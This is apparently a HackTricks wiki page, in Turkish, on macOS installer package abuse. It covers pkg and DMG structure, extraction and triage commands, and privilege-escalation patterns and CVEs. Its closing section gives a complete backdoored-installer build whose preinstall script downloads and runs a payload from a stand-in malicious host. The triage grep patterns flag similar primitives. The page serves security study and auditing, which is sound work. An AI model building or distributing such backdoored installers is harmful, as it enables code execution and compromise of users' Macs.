# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Temel Bilgileri

Bir macOS **installer package** (`.pkg` dosyası olarak da bilinir), macOS tarafından **software dağıtmak** için kullanılan bir dosya biçimidir. Bu dosyalar, bir software parçasının doğru şekilde kurulup çalışması için ihtiyaç duyduğu her şeyi içeren bir **kutu** gibidir.

Package dosyasının kendisi, **hedef** bilgisayara kurulacak **dosya ve dizin hiyerarşisini** barındıran bir arşivdir. Ayrıca kurulumdan önce ve sonra görevleri gerçekleştirmek için **scriptler** de içerebilir; örneğin configuration dosyalarını ayarlamak veya software'in eski sürümlerini temizlemek gibi.

### Paket Yapısı

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Özelleştirmeler (başlık, karşılama metni…) ve script/kurulum kontrolleri
- **PackageInfo (xml)**: Bilgiler, kurulum gereksinimleri, kurulum konumu ve çalıştırılacak scriptlerin yolları
- **Bill of materials (bom)**: Dosya izinleriyle birlikte kurulacak, güncellenecek veya kaldırılacak dosyaların listesi
- **Payload (CPIO archive gzip compressed)**: PackageInfo içindeki `install-location` konumuna kurulacak dosyalar
- **Scripts (CPIO archive gzip compressed)**: Çalıştırılmak üzere geçici bir dizine çıkarılan kurulum öncesi ve sonrası scriptler ile diğer kaynaklar.

### Sıkıştırmayı Açma
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Installer'ın içeriğini manuel olarak decompress etmeden görüntülemek için ücretsiz [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) aracını da kullanabilirsiniz.

### Static triage kısayolları

Amaç analiz yapmaksa paketi önce `Installer.app` ile açmaktan **kaçınmaya** çalışın. Bazı paketler, Installer onları açar açmaz kod çalıştırabilir (örneğin `system.run()` veya installer plug-in'leri aracılığıyla); bu nedenle offline extraction genellikle daha güvenli bir başlangıçtır.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG Temel Bilgileri

DMG dosyaları veya Apple Disk Images, Apple'ın macOS işletim sistemi tarafından disk images için kullanılan bir dosya formatıdır. Bir DMG dosyası temel olarak, ham block verilerini genellikle sıkıştırılmış ve bazen şifrelenmiş şekilde içeren **mount edilebilir bir disk image**'dır (kendi filesystem'ını içerir). Bir DMG dosyasını açtığınızda macOS, içeriğine erişebilmeniz için onu **fiziksel bir diskmiş gibi mount eder**.

> [!CAUTION]
> **`.dmg`** installers dosyalarının **çok fazla formatı** desteklediğini ve geçmişte vulnerability içeren bazı formatların **kernel code execution** elde etmek için abuse edildiğini unutmayın.

### Disk Image Yapısı

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Bir DMG dosyasının hiyerarşisi içeriğe göre farklı olabilir. Ancak application DMG'leri için genellikle şu yapıyı izler:

- Top Level: Disk image'ın root seviyesidir. Genellikle application'ı ve muhtemelen Applications folder'a bir link içerir.
- Application (.app): Gerçek application'dır. macOS'ta bir application genellikle application'ı oluşturan çok sayıda ayrı dosya ve folder içeren bir package'tır.
- Applications Link: macOS'taki Applications folder'a giden bir shortcut'tır. Bunun amacı application'ı kolayca install etmenizi sağlamaktır. Application'ı install etmek için .app dosyasını bu shortcut'ın üzerine sürükleyebilirsiniz.

## pkg abuse ile Privesc

### Public directory'lerden execution

Bir pre- veya post-installation script, **`/var/tmp/Installerutil`** gibi bir dosyayı execute ederse ve attacker bu dosyayı replace edebilirse, installer onu invoke ettiğinde attacker privilege escalation gerçekleştirebilir. d talks ve walkthrough, bu insecure external-script pattern'inin varyantlarını gösterir.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Bu, çeşitli installers ve updaters tarafından bir şeyi **root olarak execute etmek** için çağrılan bir [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)'dır. Bu function, **execute edilecek** **file**'ın **path**'ini parameter olarak kabul eder; ancak attacker bu dosyayı **modify** edebilirse, root ile gerçekleştirilen execution'ı **abuse ederek privilege escalation** yapabilir.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Daha fazla bilgi için şu konuşmaya bakın: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Environment ve shebang abuse

Modern PackageKit açıkları, installer script'lerinin genellikle **trusted root code** olarak yürütüldüğünü ve aynı zamanda attacker-controlled context'i yakında tutmaya devam ettiğini gösterdi. Vendor package'lerini denetlerken özellikle şunlara dikkat edin:

- `#!/bin/zsh` / `#!/bin/bash` gibi Shell interpreter'ları
- `sudo -u $USER`, `launchctl asuser` gibi çağrılar veya `$USER`, `$HOME`, `PATH`, `TMPDIR` ya da relative path'lere güvenen tüm mantık
- User-controlled init file'ları veya library'leri yükleyebilen non-shell interpreter'lar
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
2024 PackageKit root-environment bug'ı (`~/.zshenv` / `~/.bash*` kullanıcı tarafından başlatılan install işlemleri sırasında inheritance), için [generic macOS privesc sayfasına](../macos-privilege-escalation.md) bakın. Paket **Apple-signed** ise aynı script bug'ı, `system_installd` `com.apple.rootless.install.heritable` taşıyabildiği için **SIP/TCC-relevant** hâle gelebilir; [SIP sayfasına](../macos-security-protections/macos-sip.md) bakın.<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Mount ederek execution

Bir installer `/tmp/fixedname/bla/bla` konumuna yazıyorsa, `/tmp/fixedname` üzerine noowners ile bir **mount oluşturmak** ve böylece **installation sırasında herhangi bir dosyayı modify ederek** installation process'i abuse etmek mümkündür.

Buna örnek olarak, **root olarak execution** elde etmek için **periodic script'i overwrite etmeyi** başaran **CVE-2021-26089** verilebilir. Daha fazla bilgi için şu konuşmaya bakın: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg malware olarak

### Boş Payload

İçinde bulunan malware dışında gerçek bir payload içermeden, yalnızca **pre ve post-install script'leri** bulunan bir **`.pkg`** dosyası oluşturmak mümkündür.<sup>[[2]](#references)</sup>

### Distribution xml içinde JS

Paketin **distribution xml** dosyasına **`<script>`** tag'leri eklemek mümkündür; bu kod çalıştırılır ve **`system.run`** kullanılarak **command'ler execute edilebilir**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Distribution paketlerinde bu genellikle, örneğin `allow-external-scripts="true"` ile top-level `Distribution` dosyasının external script'leri etkinleştirmesine bağlıdır. Bu nedenle yalnızca `preinstall` / `postinstall` incelemesi yeterli değildir: **Distribution XML'in kendisi** `installation-check` / `volume-check` hook'larını ve doğrudan `system.run()` / `system.runOnce()` execution path'lerini içerebilir.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoor'lu Installer

dist.xml içinde script ve JS code kullanan malicious installer
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Pkg'leri Açmak: macOS Installer Paketlerinin İçine Bakış ve Yaygın Güvenlik Açıkları](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "macOS Installer'ların Vahşi Dünyası" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Pkg'leri Açmak: macOS Installer Paketlerinin İçine Bakış](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Installer Paketlerini Exploit Etme](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Apple Tarafından İmzalanmış Paketlerle SIP'yi Kırma](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Bug'lar Dağı" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - macOS'ta 1000 Installer Tarafından Ölüm ve Her Şey Bozuk!](https://www.youtube.com/watch?v=lTOItyjTTkw)
{{#include ../../../banners/hacktricks-training.md}}
